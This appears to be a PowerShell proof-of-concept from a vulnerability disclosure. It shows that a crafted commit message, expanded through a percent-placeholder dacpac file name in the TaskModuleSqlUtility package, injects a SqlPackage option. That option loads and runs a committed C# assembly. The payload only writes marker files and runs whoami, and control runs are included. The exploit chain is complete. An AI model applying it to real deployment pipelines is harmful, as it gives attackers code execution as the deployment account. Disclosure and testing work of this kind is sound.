# The argument injected past the --% stop-parsing token reaches a SqlPackage.exe option that
# makes SqlPackage LOAD AND RUN an assembly the contributor committed to the repository. This
# is code execution on the machine the task deploys to, as the deployment account, inside the
# same task invocation. Both PowerShell functions under test are read out of the published
# TaskModuleSqlUtility 0.1.7 package next to this script and run unmodified. The target is a
# local SQL Server instance created for the run. The payload writes two synthetic marker files
# and runs whoami. It contacts no host, reads no credential and deletes nothing.

$ErrorActionPreference = 'Continue'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$work = Join-Path ([System.IO.Path]::GetTempPath()) ("rce-" + [guid]::NewGuid().ToString('N').Substring(0,8))
foreach ($d in @('db','victim','contrib')) { New-Item -ItemType Directory -Force -Path (Join-Path $work $d) | Out-Null }
$repo = Join-Path $work 'db'; $victim = Join-Path $work 'victim'; $proj = Join-Path $work 'contrib'
Write-Output ("PSVersion : " + $PSVersionTable.PSVersion + "   PSEdition : " + $PSVersionTable.PSEdition)
$sqlPackage = (Get-ChildItem "C:\Program Files\Microsoft SQL Server\*\DAC\bin\SqlPackage.exe" | Select-Object -First 1).FullName
$dacBin = Split-Path -Parent $sqlPackage
Write-Output ("SqlPackage.exe  : " + $sqlPackage + "  v" + (Get-Item $sqlPackage).VersionInfo.FileVersion)

$nupkg = Join-Path $here 'taskmodulesqlutility-0.1.7.nupkg'
Copy-Item $nupkg (Join-Path $work 'pkg.zip')
Expand-Archive -Path (Join-Path $work 'pkg.zip') -DestinationPath (Join-Path $work 'pkg') -Force
$modFile = (Get-ChildItem -Recurse -Path (Join-Path $work 'pkg') -Filter 'SqlPackageOnTargetMachines.ps1' | Select-Object -First 1).FullName
Write-Output ("module sha256   : " + (Get-FileHash -Algorithm SHA256 $modFile).Hash.ToLower())
function Get-LiftedText([string]$file, [string[]]$names) {
    $tok = $null; $err = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile($file, [ref]$tok, [ref]$err)
    $fns = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
    $parts = @()
    foreach ($name in $names) {
        $f = $fns | Where-Object { $_.Name -eq $name } | Select-Object -First 1
        Write-Host ("  lifted verbatim : $name lines $($f.Extent.StartLineNumber)-$($f.Extent.EndLineNumber)")
        $parts += $f.Extent.Text
    }
    return ($parts -join "`r`n")
}
. ([scriptblock]::Create((Get-LiftedText $modFile @('Get-SqlPackageCmdArgs','ExecuteCommand'))))

# ---- the assembly the contributor commits alongside the dacpac
$markerA = Join-Path $victim 'PWNED-inproc.txt'
$markerB = Join-Path $victim 'PWNED-childproc.txt'
$cs = @"
using System;
using System.IO;
using System.Diagnostics;
using Microsoft.SqlServer.Dac.Deployment;
using Microsoft.SqlServer.Dac.Extensibility;

namespace MsrcLab
{
    [ExportDeploymentPlanModifier(MarkerContributor.Id, "1.0.0.0")]
    public class MarkerContributor : DeploymentPlanModifier
    {
        public const string Id = "MsrcLab.MarkerContributor";
        static readonly string MarkerA = @"$markerA";
        static readonly string MarkerB = @"$markerB";
        protected override void OnExecute(DeploymentPlanContributorContext context)
        {
            try {
                string who = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                Process p = Process.GetCurrentProcess();
                File.WriteAllText(MarkerA,
                    "IN-PROCESS CODE EXECUTION" + Environment.NewLine +
                    "process=" + p.ProcessName + " pid=" + p.Id + Environment.NewLine +
                    "identity=" + who + Environment.NewLine +
                    "image=" + p.MainModule.FileName + Environment.NewLine);
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c whoami > \"" + MarkerB + "\"");
                psi.UseShellExecute = false; psi.CreateNoWindow = true;
                Process.Start(psi).WaitForExit(20000);
            } catch (Exception ex) {
                File.WriteAllText(MarkerA + ".err", ex.ToString());
            }
        }
    }
}
"@
Set-Content -Path (Join-Path $proj 'Marker.cs') -Value $cs -Encoding UTF8
$refs = (Get-ChildItem $dacBin -Filter '*.dll' | ForEach-Object { '    <Reference Include="' + $_.BaseName + '"><HintPath>' + $_.FullName + '</HintPath><Private>false</Private></Reference>' }) -join "`r`n"
Set-Content -Path (Join-Path $proj 'contrib.csproj') -Encoding UTF8 -Value @"
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net472</TargetFramework>
    <AssemblyName>MsrcLab.Contrib</AssemblyName>
    <Nullable>disable</Nullable>
    <NoWarn>CA1416;CS1701;CS1702;MSB3277</NoWarn>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="System.ComponentModel.Composition" />
  </ItemGroup>
  <ItemGroup>
$refs
  </ItemGroup>
</Project>
"@
Push-Location $proj
$b = & dotnet build -c Release -o (Join-Path $proj 'out') 2>&1 | Out-String
Pop-Location
($b -split "`r?`n") | Where-Object { $_ -match 'error|Error\(s\)|Elapsed' } | Select-Object -First 5 | ForEach-Object { Write-Output ("  build> " + $_.Trim()) }
$dll = Join-Path $proj 'out\MsrcLab.Contrib.dll'
if (-not (Test-Path $dll)) { Write-Output "contributor assembly did not build"; exit 1 }
Copy-Item $dll $repo -Force
Write-Output ("  assembly committed next to the dacpac : " + (Join-Path $repo 'MsrcLab.Contrib.dll'))

# ---- seed a source database and extract the dacpac the contributor authors
& SqlLocalDB.exe create MSRCRCE 2>&1 | Out-Null
& SqlLocalDB.exe start  MSRCRCE 2>&1 | Out-Null
$target = '(localdb)\MSRCRCE'
Set-Content -Path (Join-Path $work 'seed.sql') -Encoding ASCII -Value @"
CREATE DATABASE SrcDb;
GO
USE SrcDb;
GO
CREATE TABLE dbo.[ZZMARKER_ATTACKER_AUTHORED_OBJECT] (id INT NOT NULL);
GO
"@
& sqlcmd -S $target -i (Join-Path $work 'seed.sql') 2>&1 | Select-Object -First 2 | ForEach-Object { Write-Output ("  seed> " + $_) }
$srcDac = Join-Path $repo 'Fab.dacpac'
& $sqlPackage '/Action:Extract' "/SourceServerName:$target" '/SourceDatabaseName:SrcDb' "/TargetFile:$srcDac" 2>&1 | Select-Object -Last 1 | ForEach-Object { Write-Output ("  extract> " + $_) }
Copy-Item $srcDac (Join-Path $repo 'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac') -Force
Write-Output "  files the contributor commits:"
Get-ChildItem $repo | ForEach-Object { Write-Output ("    " + $_.Name) }

function Reset-Markers { Remove-Item $markerA, ($markerA + '.err'), $markerB -Force -ErrorAction SilentlyContinue }
function Show-Markers([string]$tag) {
    Write-Output ("  [$tag] IN-PROCESS CODE RAN    : " + (Test-Path $markerA))
    if (Test-Path $markerA) { (Get-Content $markerA) | Where-Object { $_.Trim() } | ForEach-Object { Write-Output ("      > " + $_) } }
    if (Test-Path ($markerA + '.err')) { (Get-Content ($markerA + '.err')) | Select-Object -First 4 | ForEach-Object { Write-Output ("      ! " + $_) } }
    Write-Output ("  [$tag] CHILD PROCESS RAN      : " + (Test-Path $markerB))
    if (Test-Path $markerB) { (Get-Content $markerB) | Where-Object { $_.Trim() } | ForEach-Object { Write-Output ("      > whoami said " + $_.Trim()) } }
}
$db = 0
function RunLeg([string]$label, [string]$fileName, [string]$commitMsg) {
    $script:db++
    Write-Host ""
    Write-Host "================ $label"
    Write-Host ("  committed file name : " + $fileName)
    Write-Host ("  commit message      : " + $commitMsg)
    $env:BUILD_SOURCEVERSIONMESSAGE = $commitMsg
    $dacpac = Join-Path $repo $fileName
    $a = Get-SqlPackageCmdArgs -dacpacFile $dacpac -targetMethod 'server' -serverName $target -databaseName ("Fabrikam" + $script:db) -additionalArguments ''
    Write-Host ("  argument string     : " + $a)
    try { $out = ExecuteCommand -FileName $sqlPackage -Arguments $a } catch { $out = "$_" }
    ($out -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 3 | ForEach-Object { Write-Host ("  out> " + $_.Trim()) }
    ($out -split "`r?`n") | Where-Object { $_ -match 'Update complete|Successfully|error|\*\*\*' } | Select-Object -First 2 | ForEach-Object { Write-Host ("  out> " + $_.Trim()) }
}

$junk = Join-Path $work 'junk'
$msgRce  = '.dacpac" /p:AdditionalDeploymentContributors="MsrcLab.MarkerContributor" /DiagnosticsFile:"' + $junk
$msgPlain = '.dacpac" /DiagnosticsFile:"' + $junk

Reset-Markers
RunLeg 'INJECT  attacker assembly is loaded and executed' 'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac' $msgRce
Show-Markers 'INJECT'

Reset-Markers
Write-Output ""
Write-Output "########## CONTROL 1, identical commit message, percent signs removed from the committed name"
RunLeg 'CONTROL 1 percent signs removed' 'Fab.dacpac' $msgRce
Show-Markers 'CONTROL 1'

Reset-Markers
Write-Output ""
Write-Output "########## CONTROL 2, percent form kept, no contributor option in the commit message"
RunLeg 'CONTROL 2 no injected option' 'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac' $msgPlain
Show-Markers 'CONTROL 2'

Write-Output ""
Write-Output "DONE"
exit 0
